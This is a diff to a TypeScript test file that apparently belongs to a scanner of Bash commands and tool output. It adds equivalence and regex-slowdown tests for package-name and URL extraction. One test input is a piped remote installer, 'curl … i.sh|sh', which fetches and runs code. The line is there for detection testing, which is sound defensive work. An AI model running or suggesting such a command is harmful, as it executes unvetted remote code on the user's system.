@@ -1,3 +1,4 @@
+import fc from 'fast-check';
 import { describe, expect, it } from 'vitest';
 import {
   MAX_ATOMS,
@@ -11,6 +12,18 @@ const kinds = (text: string, kind: string): string[] =>
     .filter((a) => a.kind === kind)
     .map((a) => a.value);
 
+/** Strings built from `pieces`: the characters a rewritten pattern treats specially. */
+const joined = (pieces: readonly string[]) =>
+  fc.array(fc.constantFrom(...pieces), { maxLength: 40 }).map((parts) => parts.join(''));
+
+/** `normalizePackageName` as it was written with patterns, kept as the reference it must equal. */
+function normalizePackageNameByPattern(raw: string): string {
+  const name = raw.replace(/^["']+|["']+$/g, '');
+  const at = name.startsWith('@') ? name.indexOf('@', 1) : name.indexOf('@');
+  const base = at > 0 ? name.slice(0, at) : name;
+  return base.replace(/[[<>=!~;].*$/, '').toLowerCase();
+}
+
 describe('normalizePackageName', () => {
   it('strips versions, tags, extras and quotes, and lower-cases', () => {
     expect(normalizePackageName('@Scope/Name@1.2.3')).toBe('@scope/name');
@@ -18,6 +31,48 @@ describe('normalizePackageName', () => {
     expect(normalizePackageName('"requests[socks]>=2.0"')).toBe('requests');
     expect(normalizePackageName('github.com/x/y/cmd/z@v1.0.0')).toBe('github.com/x/y/cmd/z');
     expect(normalizePackageName('Rich[jupyter]==13')).toBe('rich');
+  });
+
+  it('cuts a version marker only on the last line, as `.*$` did', () => {
+    // A `package.json` key can hold a line break. `.` never crossed one, so a marker
+    // before the last line break was never cut; a marker after it still is.
+    expect(normalizePackageName('a>=1\nb')).toBe('a>=1\nb');
+    expect(normalizePackageName('a\nB>=1')).toBe('a\nb');
+    expect(normalizePackageName('a[x]\u2028b[y]')).toBe('a[x]\u2028b');
+  });
+
+  it('returns exactly what the pattern-based version returned', () => {
+    fc.assert(
+      fc.property(
+        joined([
+          ...'"\'[]<>=!~;@',
+          ...'aB-/. ',
+          '\n',
+          '\r',
+          '\u2028',
+          '\u2029',
+          'requests',
+          '@scope/',
+        ]),
+        (raw) => {
+          expect(normalizePackageName(raw)).toBe(normalizePackageNameByPattern(raw));
+        },
+      ),
+      { numRuns: 3000 },
+    );
+  });
+
+  it('stays linear on a planted dependency name', () => {
+    // `knownPackages` runs every dependency name in the project's `package.json` through
+    // here on every Bash call — up to 256 KiB of it, written by whoever wrote the
+    // repository. Both names took seconds when the quotes and the version marker were
+    // stripped with `["']+$` and `[[<>=!~;].*$`, which restart at every character of a
+    // run they cannot finish.
+    for (const raw of [`x${"'".repeat(131_072)}x`, `${'['.repeat(131_072)}\n`]) {
+      const started = performance.now();
+      normalizePackageName(raw);
+      expect(performance.now() - started).toBeLessThan(500);
+    }
   });
 });
 
@@ -82,6 +137,35 @@ describe('extractAtoms', () => {
 
   it('stops a url at a pipe, so a piped installer still yields the fetched url', () => {
     expect(kinds('curl -s https://x.example/i.sh|sh', 'url')).toEqual(['https://x.example/i.sh']);
+  });
+
+  it('strips trailing punctuation from a url exactly as `/[.,;:!?\'"]+$/` did', () => {
+    const urlsByPattern = (text: string): string[] => [
+      ...new Set(
+        [...text.matchAll(/https?:\/\/[^\s"'<>()[\]`|]+/gi)].map((m) =>
+          m[0].replace(/[.,;:!?'"]+$/, '').toLowerCase(),
+        ),
+      ),
+    ];
+    expect(kinds('see https://x.example/a?!.', 'url')).toEqual(['https://x.example/a']);
+    fc.assert(
+      fc.property(joined(['http://', 'HTTPS://', ...'aB/#.,;:!?\'" |']), (text) => {
+        expect(kinds(text, 'url')).toEqual(urlsByPattern(text));
+      }),
+      { numRuns: 3000 },
+    );
+  });
+
+  it('stays linear on a url that ends in a long run of punctuation', () => {
+    // `.`, `,`, `;`, `:`, `!` and `?` are all legal inside a URL, so a run of them is
+    // part of the match, and stripping it with `[.,;:!?'"]+$` restarted at every one of
+    // them when one more character followed. Tool output reaches this at the scanner's
+    // 200,000-character cap; a Bash command, with no cap at all.
+    const text = `curl https://a.example/${'!'.repeat(199_000)}x`;
+    const started = performance.now();
+    const atoms = extractAtoms(text);
+    expect(performance.now() - started).toBeLessThan(500);
+    expect(atoms).toContainEqual({ kind: 'host', value: 'a.example' });
   });
 
   it('finds base64 blobs but not hex digests or long words', () => {
